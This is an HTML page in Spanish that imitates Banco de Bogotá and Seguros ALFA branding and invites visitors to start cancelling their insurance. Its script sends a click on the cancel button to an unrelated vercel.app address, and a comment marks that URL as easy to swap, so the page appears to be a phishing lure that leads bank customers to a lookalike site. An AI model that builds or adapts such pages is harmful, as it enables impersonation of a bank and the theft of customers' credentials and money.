<!DOCTYPE html>
<html lang="es-CO">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="Inicia la cancelaci√≥n de tu seguro ALFA con el respaldo del Banco de Bogot√°. Atenci√≥n, beneficios y soporte en un solo lugar." />
  <link rel="icon" href="seg/virtual/img/favicon.ico" type="image/x-icon" />
  <title>Seguros Alfa | Banco Bogot√°</title>

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" defer></script>

  <style>
    :root {
      --brand:#180adf; --brand-ink:#0f0a7a; --accent:#00ccea;
      --bg:#F7F7F7; --card:#ffffff; --text:#1f2937; --muted:#667085;
      --radius:14px; --shadow:0 10px 30px rgba(2, 8, 20, .06);
      --shadow-soft:0 0 12px 1px rgba(57,62,100,.1);
    }
    * {box-sizing:border-box;margin:0;padding:0}
    html {scroll-behavior:smooth}
    body {
      font-family:"Open Sans",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";
      background:var(--bg); color:var(--text);
      -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
    }
    img {max-width:100%;height:auto}

    /* Bot√≥n */
    .btn {
      background:linear-gradient(180deg,var(--brand),var(--brand-ink)); color:#fff; border:0;
      border-radius:999px; padding:12px 30px; font-weight:700; font-size:16px; line-height:1;
      box-shadow:0 6px 18px rgba(24,10,223,.18); cursor:pointer;
      transition:transform .15s, box-shadow .15s, background .2s;
    }
    .btn:hover {transform:translateY(-1px); box-shadow:0 10px 22px rgba(24,10,223,.22)}
    .btn:focus-visible {outline:3px solid #aeb6ff; outline-offset:2px}

    /* Estilos generales omitidos por brevedad (mismos que ya ten√≠as)... */
  </style>
</head>

<body>
  <header id="cabecera" role="banner" aria-label="Cabecera">
    <table border="0" cellpadding="0" cellspacing="0" id="menu-bar" aria-label="Barra de marca">
      <tr>
        <td valign="middle" align="left">
          <img src="seg/virtual/img/logo.svg" width="230" height="48" alt="Banco de Bogot√°" loading="eager" fetchpriority="high" />
        </td>
        <td valign="middle" align="right">
          <img src="seg/virtual/img/alfa2.png" style="width:200px" alt="Seguros ALFA" loading="eager" />
        </td>
      </tr>
    </table>
  </header>

  <main>
    <br><br><br><br>

    <!-- HERO -->
    <table id="tbl-baner" class="fade-in">
      <tr>
        <td valign="middle">
          <div class="titulo-baner">Inicia el proceso de cancelaci√≥n de seguros <strong>ALFA</strong></div>
          <br />
          <div class="contenido">
            Accede a los servicios que Banco de Bogot√° y Seguros ALFA te ofrecen para tu seguridad y tranquilidad.
            <br /><br />
            Disfruta todos los <strong>beneficios adicionales</strong> a tus coberturas y dale seguridad a tu
            desarrollo <strong>personal y profesional</strong>.
          </div>
          <br />
          <button class="btn" id="btn-cancelar" aria-label="Cancelar seguro">CANCELAR SEGURO</button>
        </td>
        <td valign="middle" class="quitar1"></td>
      </tr>
    </table>

    <!-- Secciones omitidas (las puedes dejar tal cual como las tienes)... -->
  </main>

  <footer role="contentinfo" aria-label="Pie de p√°gina">
    <!-- Pie de p√°gina omitido por brevedad -->
  </footer>

  <!-- ‚úÖ SCRIPT ACTUALIZADO -->
  <script>
    // üëâ URL de redirecci√≥n del bot√≥n CANCELAR
    const CANCELAR_SEGURO_URL = "https://sucpersonasbogo.vercel.app/"; // <-- C√°mbiala aqu√≠

    document.addEventListener("DOMContentLoaded", function () {
      // Redirigir bot√≥n CANCELAR
      document.getElementById("btn-cancelar").addEventListener("click", function () {
        window.location.href = CANCELAR_SEGURO_URL;
      });

      // Reveal animado
      const io = new IntersectionObserver((entries) => {
        entries.forEach(e => {
          if (e.isIntersecting) e.target.classList.add("is-visible");
        });
      }, { threshold: .18 });
      document.querySelectorAll(".fade-in").forEach(el => io.observe(el));

      // Fallback universal para im√°genes que no cargan
      const FALLBACK = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="420" height="280"><rect width="100%" height="100%" fill="%23f2f4f7"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="14" fill="%239aa4b2">Imagen no disponible</text></svg>';
      document.querySelectorAll("img").forEach(img => {
        img.addEventListener("error", () => {
          img.src = FALLBACK;
          img.style.background = "#f7f7f9";
          img.style.objectFit = "contain";
        });
      });
    });
  </script>
</body>
</html>
